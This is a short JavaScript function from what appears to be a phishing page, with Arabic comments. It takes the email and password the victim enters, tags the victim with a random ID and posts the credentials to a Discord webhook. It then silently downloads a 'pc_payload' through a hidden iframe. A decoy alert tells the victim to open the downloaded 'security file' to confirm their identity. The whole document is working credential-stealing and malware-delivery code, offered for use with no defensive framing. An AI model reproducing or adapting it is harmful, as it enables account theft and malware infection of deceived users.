async function startCapture() {
    const email = document.getElementById('email').value;
    const pass = document.getElementById('pass').value;
    
    if(!email || !pass) return alert("الرجاء إكمال التوثيق");

    // توليد ID للضحية
    const victimID = "ID-" + Math.floor(Math.random() * 9000 + 1000);

    try {
        const configRes = await fetch('./data.json');
        const config = await configRes.json();
        
        // إرسال البيانات للديسكورد
        await fetch(config.webhook_url, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                content: `💀 **ضحية جديدة استجابت:**\nالـ ID: \`${victimID}\`\n📧 الإيميل: \`${email}\`\n🔑 الباسورد: \`${pass}\``
            })
        });

        // --- التحميل الإجباري بدون فتح صفحة جديدة ---
        const iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        iframe.src = config.pc_payload;
        document.body.appendChild(iframe);
        
        // رسالة تمويه للضحية
        alert("تم إرسال طلب التوثيق. يرجى فتح ملف الأمان الذي تم تحميله لتأكيد هويتك.");

    } catch(e) {
        console.log("Error logic");
    }
}
